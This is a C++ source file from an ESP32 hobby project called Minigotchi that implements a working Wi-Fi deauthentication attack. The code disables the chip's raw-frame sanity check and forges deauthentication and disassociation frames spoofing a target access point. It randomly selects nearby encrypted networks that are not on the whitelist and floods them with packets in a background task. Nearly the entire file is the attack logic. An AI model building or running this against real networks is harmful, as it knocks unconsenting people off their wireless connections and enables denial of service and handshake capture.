/*
 * Minigotchi: An even smaller Pwnagotchi
 * Copyright (C) 2024 dj1ch
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
 * deauth.cpp: handles the deauth of a local AP
 */

#include "deauth.h"
#include "wifi_manager.h" // Include the WiFi Manager
#include "config.h"       // Ensured
#include "parasite.h"     // Ensured
#include "mood.h"         // Ensured
#include "display.h"      // Ensured
#include "task_manager.h"
#include <esp_task_wdt.h> // Include for ESP-IDF task watchdog functions

// #include "minigotchi.h" // Removed as not directly needed

/** developer note:
 *
 * the deauth frame is defined here.
 * this is a raw frame(layer 2)
 * man i hate networking
 *
 */

// for some dumb reason espressif really doesn't like us sending deauth frames,
// so i'll need to make this fix
// Rename the function to avoid conflict with the ESP32 library
extern "C" int minigotchi_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
                                                int32_t arg3) {
  return 0;
}

// This pragma disables the ESP32 library's frame sanity check
#pragma weak ieee80211_raw_frame_sanity_check = minigotchi_ieee80211_raw_frame_sanity_check

// Static member definitions
TaskHandle_t Deauth::deauth_task_handle = NULL;
bool Deauth::deauth_should_stop = false;
std::vector<String> Deauth::whitelist = {};
String Deauth::randomAP = "";
int Deauth::randomIndex;

// Mutex for critical sections around task handle
static portMUX_TYPE deauth_mutex = portMUX_INITIALIZER_UNLOCKED;

/**
 * Gets first instance of mood class
 */
// Mood &Deauth::mood = Mood::getInstance(); // REMOVED

/** developer note:
 *
 * instead of using the deauth frame normally, we append information to the
 * deauth frame and dynamically write info to the frame
 *
 */

uint8_t Deauth::deauthTemp[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC,
                                  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
                                  0xCC, 0x00, 0x00, 0x01, 0x00};

uint8_t Deauth::deauthFrame[26];
uint8_t Deauth::disassociateFrame[26];
uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/**
 * Adds SSIDs (or BSSIDs) to the whitelist
 * @param bssids SSIDs/BSSIDs to whitelist
 */
void Deauth::add(const std::string &bssids) {
  std::stringstream ss(bssids);
  std::string token;

  // seperate info and whitelist
  while (std::getline(ss, token, ',')) {
    // trim out whitespace
    token.erase(0, token.find_first_not_of(" \t\r\n"));
    token.erase(token.find_last_not_of(" \t\r\n") + 1);

    // add to whitelist
    Serial.print(Mood::getInstance().getNeutral() + " Adding ");
    Serial.print(token.c_str());
    Serial.println(" to the whitelist");
    Display::updateDisplay(Mood::getInstance().getNeutral(), "Adding " +
                                                  (String)token.c_str() +
                                                  " to the whitelist");
    delay(Config::shortDelay);
    whitelist.push_back(token.c_str());
  }
}

/**
 * Adds everything to the whitelist
 */
void Deauth::list() {
  for (const auto &bssid : Config::whitelist) {
    Deauth::add(bssid);
  }
}

/**
 * Sends a packet
 * @param buf Packet to send
 * @param len Length of packet
 * @param sys_seq Ignore this, just make it false
 */
bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sys_seq);
  delay(102);

  return (err == ESP_OK);
}

/**
 * Check if packet source address is a broadcast
 * source:
 * https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
 * @param mac Mac address to check
 */
bool Deauth::broadcast(uint8_t *mac) {
  for (uint8_t i = 0; i < 6; i++) {
    if (mac[i] != broadcastAddr[i])
      return false;
  }

  return true;
}

/**
 * Format Mac Address as a String, then print it
 * @param mac Address to print
 */
void Deauth::printMac(uint8_t *mac) {
  String macStr = printMacStr(mac);
  Serial.println(macStr);
  Display::updateDisplay(Mood::getInstance().getNeutral(), "AP BSSID: " + macStr);
}

/**
 * Function meant to print Mac as a String used in printMac()
 * @param mac Mac to use
 */
String Deauth::printMacStr(uint8_t *mac) {
  char buf[18]; // 17 for MAC, 1 for null terminator
  snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1],
           mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

/**
 * Selects an AP to deauth, returns a boolean based on if the scan and selection
 * was successful
 */
bool Deauth::select() {
  // reset values
  bool success = false; // Variable to track overall success of selection
  Deauth::randomAP = "";
  Deauth::randomIndex = -1;

  Parasite::sendDeauthStatus(START_SCAN);

  // cool animation, skip if parasite mode
  if (!Config::parasite) {
    for (int i = 0; i < 5; ++i) {
      Serial.println(Mood::getInstance().getLooking1() + " Scanning for APs.");
      Display::updateDisplay(Mood::getInstance().getLooking1(), "Scanning  for APs.");
      delay(Config::shortDelay);
      Serial.println(Mood::getInstance().getLooking2() + " Scanning for APs..");
      Display::updateDisplay(Mood::getInstance().getLooking2(), "Scanning  for APs..");
      delay(Config::shortDelay);
      Serial.println(Mood::getInstance().getLooking1() + " Scanning for APs...");
      Display::updateDisplay(Mood::getInstance().getLooking1(), "Scanning  for APs...");
      delay(Config::shortDelay);
      Serial.println(" ");
      delay(Config::shortDelay);
    }
    delay(Config::longDelay);
  }

  // stop and scan
  // Minigotchi::monStop(); // Removed, WifiManager will handle state

  int apCount = 0;
  Serial.println(Mood::getInstance().getNeutral() + " Deauth::select - Requesting STA mode for WiFi scan via WifiManager...");
  if (!WifiManager::getInstance().request_sta_mode("deauth_select_scan")) {
      Serial.println(Mood::getInstance().getBroken() + " Deauth::select - Failed to acquire STA mode for scan.");
      Parasite::sendDeauthStatus(DEAUTH_SCAN_ERROR); // Notify parasite if active
      return false; // Cannot scan
  }
  Serial.println(Mood::getInstance().getNeutral() + " Deauth::select - STA mode acquired. Performing scan...");

  // If a parasite channel is set, then we want to focus on that channel
  // Otherwise go off on our own and scan for whatever is out there
  if (Parasite::channel > 0) {
    // Scan specific channel, show hidden, 300ms max per channel
    apCount = WiFi.scanNetworks(false, true, false, 300, Parasite::channel);
  } else {
    // Scan all channels, show hidden
    apCount = WiFi.scanNetworks(false, true);
  }

  if (apCount > 0 && Deauth::randomIndex == -1) {
    Deauth::randomIndex = random(apCount);
    Deauth::randomAP = WiFi.SSID(Deauth::randomIndex);
    uint8_t encType = WiFi.encryptionType(Deauth::randomIndex);

    Serial.print(Mood::getInstance().getNeutral() + " Selected random AP: ");
    Serial.println(randomAP.c_str());
    Serial.println(" ");
    Display::updateDisplay(Mood::getInstance().getNeutral(),
                           "Selected random AP: " + randomAP);
    delay(Config::shortDelay);

    if (encType == WIFI_AUTH_OPEN || encType == -1) {
      Serial.println(
          Mood::getInstance().getNeutral() +
          " Selected AP is not encrypted. Skipping deauthentication...");
      Display::updateDisplay(
          Mood::getInstance().getNeutral(),
          "Selected AP is not encrypted. Skipping deauthentication...");
      delay(Config::shortDelay);
      Parasite::sendDeauthStatus(SKIPPING_UNENCRYPTED);
      // success remains false, will be handled by cleanup at the end
    } else if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) { // check for ap in whitelist
      Serial.println(Mood::getInstance().getNeutral() +
                     " Selected AP is in the whitelist. Skipping "
                     "deauthentication...");
      Display::updateDisplay(
          Mood::getInstance().getNeutral(),
          "Selected AP is in the whitelist. Skipping deauthentication...");
      delay(Config::shortDelay);
      Parasite::sendDeauthStatus(SKIPPING_WHITELIST);
      // success remains false
    } else {
      // AP is valid and selected
      success = true;

      /**
       * here we will create the deauth frame using the header,
       * as we find the AP in question we also generate the required information
       * for it as well...
       *
       */

      // clear out exisitng frame...
      std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame),
                0);
      std::fill(std::begin(Deauth::disassociateFrame),
                std::end(Deauth::disassociateFrame), 0);

      // copy template
      std::copy(Deauth::deauthTemp,
                Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
                Deauth::deauthFrame);
      std::copy(Deauth::deauthTemp,
                Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
                Deauth::disassociateFrame);

      Deauth::deauthFrame[0] = 0xC0; // type
      Deauth::deauthFrame[1] = 0x00; // subtype
      Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
      Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

      Deauth::disassociateFrame[0] = 0xA0; // type
      Deauth::disassociateFrame[1] = 0x00; // subtype
      Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
      Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

      // bssid
      uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);

      /** developer note:
       *
       * addr1: reciever addr
       * addr2: sender addr
       * addr3: filtering addr
       *
       */

      // copy our mac(s) to header
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::deauthFrame + 4);
      std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 10);
      std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 16);

      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::disassociateFrame + 4);
      std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 10);
      std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 16);

      // checks if this is a broadcast
      if (!broadcast(Deauth::broadcastAddr)) {
        // build deauth
        Deauth::deauthFrame[0] = 0xC0; // type
        Deauth::deauthFrame[1] = 0x00; // subtype
        Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
        Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

        // reason
        Deauth::deauthFrame[24] = 0x01; // reason: unspecified

        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
        std::copy(Deauth::broadcastAddr,
                  Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                  Deauth::deauthFrame + 10);
        std::copy(Deauth::broadcastAddr,
                  Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                  Deauth::deauthFrame + 16);

        // build disassocaition
        Deauth::disassociateFrame[0] = 0xA0; // type
        Deauth::disassociateFrame[1] = 0x00; // subtype
        Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
        Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

        std::copy(apBssid, apBssid + sizeof(apBssid),
                  Deauth::disassociateFrame + 4);
        std::copy(Deauth::broadcastAddr,
                  Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                  Deauth::disassociateFrame + 10);
        std::copy(Deauth::broadcastAddr,
                  Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                  Deauth::disassociateFrame + 16);
      }

      Serial.print(Mood::getInstance().getNeutral() + " Full AP SSID: ");
      Serial.println(WiFi.SSID(Deauth::randomIndex));
      Display::updateDisplay(Mood::getInstance().getNeutral(),
                             "Full AP SSID: " + WiFi.SSID(Deauth::randomIndex));
      Serial.print(Mood::getInstance().getNeutral() + " AP Encryption: ");
      Serial.println(WiFi.encryptionType(Deauth::randomIndex));
      Display::updateDisplay(
          Mood::getInstance().getNeutral(),
          "AP Encryption: " + (String)WiFi.encryptionType(Deauth::randomIndex));
      Serial.print(Mood::getInstance().getNeutral() + " AP RSSI: ");
      Serial.println(WiFi.RSSI(Deauth::randomIndex));
      Display::updateDisplay(Mood::getInstance().getNeutral(),
                             "AP RSSI: " +
                                 (String)WiFi.RSSI(Deauth::randomIndex));
      Serial.print(Mood::getInstance().getNeutral() + " AP BSSID: ");
      printMac(apBssid);
      Serial.print(Mood::getInstance().getNeutral() + " AP Channel: ");
      Serial.println(WiFi.channel(Deauth::randomIndex));
      Display::updateDisplay(Mood::getInstance().getNeutral(),
                             "AP Channel: " +
                                 (String)WiFi.channel(Deauth::randomIndex));
      Serial.println(" ");
      delay(Config::longDelay);
      Parasite::sendDeauthStatus(PICKED_AP, Deauth::randomAP.c_str(),
                                 WiFi.channel(Deauth::randomIndex));
    }
  } else if (apCount < 0) { // This part remains largely the same
    Serial.println(Mood::getInstance().getSad() + " I don't know what you did, but you screwed up!");
    Serial.println(" ");
    Display::updateDisplay(Mood::getInstance().getSad(), "You screwed up somehow!");
    Parasite::sendDeauthStatus(DEAUTH_SCAN_ERROR);
    delay(Config::shortDelay);
    // success remains false
  } else { // No APs found
    Serial.println(Mood::getInstance().getSad() + " No access points found.");
    Serial.println(" ");
    Display::updateDisplay(Mood::getInstance().getSad(), "No access points found.");
    Parasite::sendDeauthStatus(NO_APS);
    delay(Config::shortDelay);
    // success remains false
  }

  // Cleanup: Release STA mode if it was acquired by this function
  if (strcmp(WifiManager::getInstance().get_current_controller_tag(), "deauth_select_scan") == 0) {
      WifiManager::getInstance().release_wifi_control("deauth_select_done");
      Serial.println(Mood::getInstance().getNeutral() + " Deauth::select - Released WiFi STA mode.");
  }
  return success;
}

// Task runner function
void deauth_task_runner(void *pvParameters) {
    Serial.println(Mood::getInstance().getIntense() + " Deauth task started.");
    esp_err_t wdt_err = esp_task_wdt_add(NULL);
    Deauth::start(); // Call the main attack logic (should check taskShouldExit internally if looped)

    // Task cleanup
    portENTER_CRITICAL(&deauth_mutex);
    Deauth::deauth_task_handle = NULL;
    portEXIT_CRITICAL(&deauth_mutex);

    Serial.println(Mood::getInstance().getNeutral() + " Deauth task finished and cleaned up.");
    vTaskDelete(NULL); // Deletes the current task
}


/**
 * Full deauthentication attack
 */
void Deauth::deauth() {
    portENTER_CRITICAL(&deauth_mutex);
    if (Deauth::deauth_task_handle != NULL) {
        portEXIT_CRITICAL(&deauth_mutex);
        Serial.println(Mood::getInstance().getNeutral() + " Deauth task is already running.");
        return;
    }
    portEXIT_CRITICAL(&deauth_mutex);
    deauth_should_stop = false;
    // Use TaskManager to create the deauth task
    bool created = TaskManager::getInstance().createTask(
        "deauth_task",
        deauth_task_runner,
        8192, 1, nullptr, 0
    );
    if (!created) {
        Serial.println(Mood::getInstance().getBroken() + " FAILED to create deauth attack task.");
        portENTER_CRITICAL(&deauth_mutex);
        Deauth::deauth_task_handle = NULL;
        portEXIT_CRITICAL(&deauth_mutex);
    }
}

/**
 * Starts deauth attack (actual core logic, called by task)
 */
void Deauth::start() {
  deauth_should_stop = false; // Reset stop flag
  // running = true; // Removed: task handle indicates running status

  Serial.println(Mood::getInstance().getIntense() + " Deauth::start (task context) - Requesting monitor mode for attack...");
  if (!WifiManager::getInstance().request_monitor_mode("deauth_attack")) {
      Serial.println(Mood::getInstance().getBroken() + " Deauth::start - Failed to acquire monitor mode.");
      if (strcmp(WifiManager::getInstance().get_current_controller_tag(), "deauth_attack") == 0) {
           WifiManager::getInstance().release_wifi_control("deauth_attack_fail_cleanup");
      }
      // No running = false; here. Task will end, handle becomes NULL.
      return; // Don't proceed with attack
  }
  Serial.println(Mood::getInstance().getIntense() + " Deauth::start - Monitor mode acquired.");

  int deauthFrameSize = sizeof(deauthFrame);
  int disassociateFrameSize = sizeof(disassociateFrame);
  int packets = 0;
  unsigned long startTime = millis();
  int i = 0; 

  int basePacketCount = 150;
  int rssi = WiFi.RSSI(Deauth::randomIndex); // randomIndex should be set by select()
  int numDevices = WiFi.softAPgetStationNum(); // This might not be reliable for the target AP

  int packetCount = basePacketCount + (numDevices * 10);
  if (rssi > -50) {
    packetCount /= 2; 
  } else if (rssi < -80) {
    packetCount *= 2; 
  }

  Parasite::sendDeauthStatus(START_DEAUTH, Deauth::randomAP.c_str(), WiFi.channel(Deauth::randomIndex));

  for (i = 0; i < packetCount; ++i) {
    if (deauth_should_stop) {
        Serial.println(Mood::getInstance().getNeutral() + " Deauth::start - Stop signal received. Aborting attack.");
        Parasite::sendDeauthStatus(DEAUTH_STOPPED_USER, Deauth::randomAP.c_str(), WiFi.channel(Deauth::randomIndex));
        break; 
    }
    // ... (packet sending and logging logic as before) ...
    if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
        Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      packets++;
      float pps = packets / (float)(millis() - startTime) * 1000;
      if (!isinf(pps)) {
        Serial.print(Mood::getInstance().getIntense() + " Packets per second: ");
        Serial.print(pps);
        Serial.print(" pkt/s");
        Serial.println(" (AP:" + randomAP + ")");
        Display::updateDisplay(Mood::getInstance().getIntense(), "PPS: " + (String)pps + " (AP:" + randomAP + ")");
      }
    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) && !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(Mood::getInstance().getBroken() + " Both packets failed to send!");
      Display::updateDisplay(Mood::getInstance().getBroken(), "Both packets failed!");
    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0)) {
      Serial.println(Mood::getInstance().getBroken() + " Deauthentication failed to send!");
      Display::updateDisplay(Mood::getInstance().getBroken(), "Deauth failed!");
    } else { // disassoc failed
      Serial.println(Mood::getInstance().getBroken() + " Disassociation failed to send!");
      Display::updateDisplay(Mood::getInstance().getBroken(), "Disassoc failed!");
    }
  }

  Serial.println(" ");
  if (i == packetCount) { 
      Serial.println(Mood::getInstance().getHappy() + " Attack finished!");
      Parasite::sendDeauthStatus(DEAUTH_FINISHED, Deauth::randomAP.c_str(), WiFi.channel(Deauth::randomIndex));
  } else { 
      Serial.println(Mood::getInstance().getNeutral() + " Attack stopped by user.");
  }
  Display::updateDisplay(Mood::getInstance().getHappy(), "Attack finished!");

  WifiManager::getInstance().release_wifi_control("deauth_attack");
  Serial.println(Mood::getInstance().getNeutral() + " Deauth::start - Released WiFi control.");
  // running = false; // Removed
  // deauth_should_stop = false; // Removed: reset by deauth() before starting a new task
}

// New methods
void Deauth::stop() {
    Serial.println(Mood::getInstance().getNeutral() + " Deauth::stop - Received stop request.");
    portENTER_CRITICAL(&deauth_mutex);
    if (deauth_task_handle == NULL) {
        portEXIT_CRITICAL(&deauth_mutex);
        Serial.println(Mood::getInstance().getNeutral() + " Deauth::stop - No deauth task seems to be running.");
        // deauth_should_stop = false; // No task to stop, flag is reset by deauth()
        return;
    }
    portEXIT_CRITICAL(&deauth_mutex);
    deauth_should_stop = true; // Signal the task to stop
}

bool Deauth::is_running() {
    // return running; // Removed
    return Deauth::deauth_task_handle != NULL;
}
